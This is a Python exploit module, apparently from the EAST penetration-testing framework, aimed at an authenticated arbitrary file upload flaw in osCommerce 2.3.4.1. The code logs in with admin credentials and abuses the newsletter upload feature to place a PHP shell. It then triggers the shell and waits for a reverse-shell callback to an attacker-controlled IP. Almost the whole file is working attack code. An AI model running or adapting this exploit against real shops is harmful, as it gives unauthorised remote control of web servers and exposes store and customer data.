#! /usr/bin/env python
# -*- coding: utf_8 -*-
# The exploit is a part of EAST Framework - use only under the license agreement specified in LICENSE.txt in your EAST Framework distribution

import sys
import time
import base64
import urlparse
import requests
import cStringIO

sys.path.append('./core')
sys.path.append('./shellcodes')
import ShellUtils
import Shellcodes
from Sploit import Sploit

INFO = {}
INFO['NAME'] = "efa_oscommerce_fu_rce"
INFO['DESCRIPTION'] = "osCommerce 2.3.4.1 - Arbitrary File Upload Exploit  Remote Code Execution"
INFO['VENDOR'] = "https://www.oscommerce.com/"
INFO['DOWNLOAD_LINK'] = ''
INFO['LINKS'] = ['http://0day.today/exploit/29081']
INFO["CVE Name"] = "?"
INFO["NOTES"] = """osCommerce does by default not allow Users to upload arbitrary files from the Admin Panel. However, any user being privileged enough to send newsletters can exploit an objection injection in the osCommerce core to upload any file, allowing the user to gain shell access. The user does not need to be an administrator, any account with access to the newsletters will do.
"""

INFO['CHANGELOG'] = "30 Nov, 2017. Written by Gleg team."
INFO['PATH'] = 'Exploits/Web/'

# Must be in every module, to be set by framework
OPTIONS = {}
OPTIONS["HOST"] = "127.0.0.1", dict(description = 'Target IP')
OPTIONS["PORT"] = 80, dict(description = 'Target Port')
OPTIONS["BASEPATH"] = '/oscommerce/admin', dict(description = 'Basepath')
OPTIONS["CALLBACK_IP"] = "192.168.1.43", dict(description = 'Callback IP')
OPTIONS['USERNAME'] = 'admin', dict(description = 'Admin username')
OPTIONS['PASSWORD'] = 'password', dict(description = 'Admin password')


class exploit(Sploit):
    def __init__(self, host = "", port=0, logger=None):
        Sploit.__init__(self, logger = logger)
        self.name = INFO['NAME']
        self.port = port
        self.host = host
        self.basepath = ""
        self.callback_ip = ''
        self.username = ''
        self.password = ''
    
    def args(self):
        self.args = Sploit.args(self, OPTIONS)
        self.host = self.args.get('HOST', self.host)
        self.port = int(self.args.get('PORT', self.port))
        self.basepath = self.args.get('BASEPATH', self.basepath)
        self.username = self.args.get('USERNAME', self.username)
        self.password = self.args.get('PASSWORD', self.password)
        
        self.callback_ip = self.args.get('CALLBACK_IP', OPTIONS["CALLBACK_IP"])
    
    def make_url(self, path = ''):
        return 'http://{}:{}{}{}'.format(self.host, self.port, self.basepath, path)
    
    def make_sploit(self):
        self.log("[>] Generate shellcode started")
        
        if self.args['listener']:
            port = self.args['listener']['PORT']
        else:
            return None

        s = Shellcodes.CrossOSShellcodes(self.callback_ip, port)
        shellcode = s.create_shellcode(ShellUtils.Constants.ShellcodeType.PHP, True)

        self.log("[>] Shellcode ready")
        return shellcode
    
    def authenticate(self, username, password):
        url = self.make_url('/login.php')
        session = requests.Session()
        session.get(url, allow_redirects=False)
      
        get_params = {'action': "process"}
        data = {"username": username, "password": password}
        r = session.post(url, data=data, params=get_params, allow_redirects=False)
      
        if r.status_code == 302:
            return session
        else:
            return False
    
    def run(self):
        self.args()
        
        if self.is_listener_connected() is None:
            self.log('Please, enable listener to use this module')
            self.finish(False)
        
        session = self.authenticate(self.username, self.password)
        
        if not session:
            self.log("Module wasn't able to authenticate itself to osCommerce")
            self.finish(False)
        else:
            self.log("Authentication successful")
            
        newsletter_script = self.make_url("/newsletters.php")
        r = session.get(newsletter_script, params={"action": "new"})
      
        payload = {
            'module': 'upload',
            'title': 'uploaded_fname',
            'content': './'
        }
        
        r = session.post(newsletter_script, params={"action": "insert"}, data=payload, allow_redirects=False)
        try:
            newsletter_id = urlparse.urlparse(r.headers['Location']).query[4:]
            self.log("Successfully prepared the exploit and created a new newsletter with nID" + newsletter_id)
        except:
            self.log("The script wasn't able to create a new newsletter")
            self.finish(False)
      
        r = session.post(newsletter_script, params={"action": "lock", "nID": newsletter_id})
        self.log("Successfully locked the newsletter. Now attempting to upload..")
        
        files = {
            'uploaded_fname':('shell.php', cStringIO.StringIO(self.make_sploit()))
        }
        r = session.post(newsletter_script, params={"action": "send", "nID": newsletter_id}, files=files)
        
        self.log('Uploaded! ')
        self.log('Execute shell.php ...')
        try:
            r = requests.get(self.make_url('/shell.php'), timeout=1)
        except:
            pass
            
        self.log('Wait for callback connection')
        while True:
            if self.is_listener_connected():
                break
            time.sleep(3)
        
        self.finish(True)
        

if __name__ == '__main__':
    """
        By now we only have the tool mode for exploit..
        Later we would have standalone mode also.
    """
    print "Running exploit %s .. " % INFO['NAME']
    e = exploit("192.168.0.1", 80)
    e.run()
